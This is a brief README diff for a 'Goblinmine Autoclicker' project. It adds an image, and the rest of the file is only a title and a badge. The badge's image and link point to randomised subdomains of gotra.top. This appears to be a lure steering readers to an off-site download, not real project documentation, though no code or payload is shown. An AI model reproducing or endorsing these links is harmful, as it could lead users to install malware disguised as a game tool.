@@ -1,4 +1,5 @@
 # Goblinmine Autoclicker
+![1000481264](https://github.com/user-attachments/assets/e53c5ca5-164c-4f04-a184-3593d8aecc48)
 
 #
 [![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
